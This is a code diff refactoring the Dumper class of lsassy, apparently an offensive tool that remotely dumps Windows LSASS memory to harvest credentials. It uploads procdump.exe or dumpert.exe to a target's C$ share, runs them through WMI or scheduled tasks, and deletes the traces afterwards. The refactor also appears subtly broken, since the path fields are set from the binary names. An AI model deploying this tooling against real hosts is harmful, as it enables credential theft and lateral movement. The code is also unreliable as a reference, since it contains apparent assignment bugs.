@@ -12,35 +12,63 @@ from lsassy.impacketfile import ImpacketFile
 from lsassy.taskexe import TASK_EXEC
 from lsassy.wmi import WMI
 from lsassy.defines import *
+from lsassy.utils import *
 
 
 class Dumper:
-    def __init__(self, connection, args, log):
-        self._log = log
-        self._tmp_dir = "\\Windows\\Temp\\"
-        self._share = "C$"
-        self._procdump = "procdump.exe"
-        self._dumpert = "dumpert.exe"
-        self._procdump_path = args.procdump
-        self._dumpert_path = args.dumpert
-        self._method = str(args.method)
-        self._timeout = args.timeout
 
-        if args.dumpname:
-            self._remote_lsass_dump = args.dumpname
+    class Options:
+        tmp_dir = "\\Windows\\Temp\\"
+        share = "C$"
+        dumpname = None
+        procdump = "procdump.exe"
+        dumpert = "dumpert.exe"
+        procdump_path = None
+        dumpert_path = None
+        method = 1
+        timeout = 10
+
+    def __init__(self, connection, options=Options):
+        self._log = connection.get_logger()
+
+        self._tmp_dir = options.tmp_dir
+        self._share = options.share
+        self._procdump = options.procdump
+        self._dumpert = options.dumpert
+        self._procdump_path = options.procdump
+        self._dumpert_path = options.dumpert
+        self._method = str(options.method)
+        self._timeout = options.timeout
+
+        if options.dumpname:
+            self._remote_lsass_dump = options.dumpname
             if "." not in self._remote_lsass_dump:
                 self._remote_lsass_dump += ".dmp"
         else:
             self._remote_lsass_dump = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + ".dmp"
-        self._conn = connection
-        if args.procdump is not None:
-            self._procdump_path = args.procdump
-        if args.dumpert is not None:
-            self._dumpert_path = args.dumpert
 
-        self.exec_methods = {"wmi": WMI, "task": TASK_EXEC}
-        self.procdump = False
-        self.dumpert = False
+        self._conn = connection
+        self._ifile = None
+
+        if options.procdump_path is not None:
+            self._procdump_path = options.procdump
+        if options.dumpert_path is not None:
+            self._dumpert_path = options.dumpert
+
+        self._exec_methods = {"wmi": WMI, "task": TASK_EXEC}
+        self._use_procdump = False
+        self._use_dumpert = False
+
+    def getfile(self):
+        if isinstance(self._ifile, ImpacketFile):
+            return self._ifile
+        return RetCode(ERROR_UNDEFINED)
+
+    def close(self):
+        if isinstance(self._ifile, ImpacketFile):
+            self._ifile.close()
+            return RetCode(ERROR_SUCCESS)
+        return RetCode(ERROR_UNDEFINED)
 
     def dump(self):
         """
@@ -120,7 +148,8 @@ class Dumper:
                         ifile.close()
                         return RetCode(ERROR_LSASS_PROTECTED)
                     ifile.seek(0)
-                    return ifile
+                    self._ifile = ifile
+                    return RetCode(ERROR_SUCCESS)
                 else:
                     self._log.warn("No dump file found with \"{}\" using \"{}\" exec method.".format(dump_method, exec_shell))
 
@@ -155,7 +184,7 @@ class Dumper:
             for exec_method in exec_methods:
                 try:
                     self._log.debug("Trying exec method : \"{}\"".format(exec_method))
-                    self.exec_methods[exec_method](self._conn, self._log).execute(commands)
+                    self._exec_methods[exec_method](self._conn, self._log).execute(commands)
                     self._log.debug("Exec method \"{}\" success !".format(exec_method))
                     return RetCode(ERROR_SUCCESS)
                 except Exception as e:
@@ -183,7 +212,7 @@ class Dumper:
                 self._conn.putFile(self._share, self._tmp_dir + self._procdump, procdump.read)
             except Exception as e:
                 return RetCode(ERROR_PROCDUMP_NOT_UPLOADED)
-        self.procdump = True
+        self._use_procdump = True
 
         # Dump lsass using PID
         commands = [
@@ -205,7 +234,7 @@ class Dumper:
             for exec_method in exec_methods:
                 try:
                     self._log.debug("Trying exec method : " + exec_method)
-                    self.exec_methods[exec_method](self._conn, self._log).execute(commands)
+                    self._exec_methods[exec_method](self._conn, self._log).execute(commands)
                     self._log.debug("Exec method \"{}\" success !".format(exec_method))
                     return RetCode(ERROR_SUCCESS)
                 except Exception as e:
@@ -233,7 +262,7 @@ class Dumper:
                 self._conn.putFile(self._share, self._tmp_dir + self._dumpert, dumpert.read)
             except Exception as e:
                 return RetCode(ERROR_DUMPERT_NOT_UPLOADED)
-        self.dumpert = True
+        self._use_dumpert = True
         self._remote_lsass_dump = "dumpert.dmp"
         # Dump lsass using PID
         commands = [
@@ -252,7 +281,7 @@ class Dumper:
             for exec_method in exec_methods:
                 try:
                     self._log.debug("Trying exec method : " + exec_method)
-                    self.exec_methods[exec_method](self._conn, self._log).execute(commands)
+                    self._exec_methods[exec_method](self._conn, self._log).execute(commands)
                     self._log.debug("Exec method \"{}\" success !".format(exec_method))
                     return RetCode(ERROR_SUCCESS)
                 except Exception as e:
@@ -263,26 +292,22 @@ class Dumper:
     def clean(self):
         try:
             self._conn.deleteFile(self._share, self._tmp_dir + self._remote_lsass_dump)
-            self._log.success('Deleted lsass dump')
         except Exception as e:
             if "STATUS_OBJECT_NAME_NOT_FOUND" not in str(e):
-                self._log.error('Error deleting lsass dump')
-            self._log.debug("Error : {}".format(str(e)))
+                lsassy_warn(self._log, RetCode(ERROR_DUMP_CLEANING, e))
 
-        if self.procdump:
+        if self._use_procdump:
             # Delete procdump.exe
             try:
                 self._conn.deleteFile(self._share, self._tmp_dir + self._procdump)
-                self._log.success('Deleted procdump.exe')
             except Exception as e:
-                self._log.error('Error deleting procdump.exe')
-                self._log.debug("Error : {}".format(str(e)))
+                lsassy_warn(self._log, RetCode(ERROR_PROCDUMP_CLEANING, e))
 
-        if self.dumpert:
+        if self._use_dumpert:
             # Delete dumpert.exe
             try:
                 self._conn.deleteFile(self._share, self._tmp_dir + self._dumpert)
-                self._log.success('Deleted dumpert.exe')
             except Exception as e:
-                self._log.error('Error deleting dumpert.exe')
-                self._log.debug("Error : {}".format(str(e)))
+                lsassy_warn(self._log, RetCode(ERROR_DUMPERT_CLEANING, e))
+
+        return RetCode(ERROR_SUCCESS)
